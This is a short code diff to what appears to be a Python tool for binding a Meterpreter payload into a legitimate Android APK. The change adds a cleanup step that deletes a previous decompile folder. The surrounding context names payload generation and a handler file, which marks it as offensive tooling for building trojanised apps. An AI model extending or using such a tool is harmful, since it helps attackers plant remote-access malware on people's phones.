@@ -5,6 +5,7 @@ import subprocess
 import argparse
 import random
 import banner
+import shutil
 
 pwd = os.getcwd()
 
@@ -112,7 +113,13 @@ def generate_meterpreter_payload(lhost, lport):
         print(f"{GREEN}[+] Created Successfully : {pwd}/handler.rc")
 
 def decompile_evil_and_normal_apk():
-    print(f"{YELLOW}\n[*] Decompiling Normal/Legitimate APK\n=============================================")   
+    print(f"{YELLOW}\n[*] Decompiling Normal/Legitimate APK\n=============================================")
+    
+    try:
+        shutil.rmtree(f"{pwd}/normal_apk")
+    except Exception:
+        pass
+        
     decompile_normal_apk = os.system(f"apktool d {arguments.normal_apk} -o {pwd}/normal_apk")
     if decompile_normal_apk == 0:
         print(f"{GREEN}[+] Decompiled Successfully !")
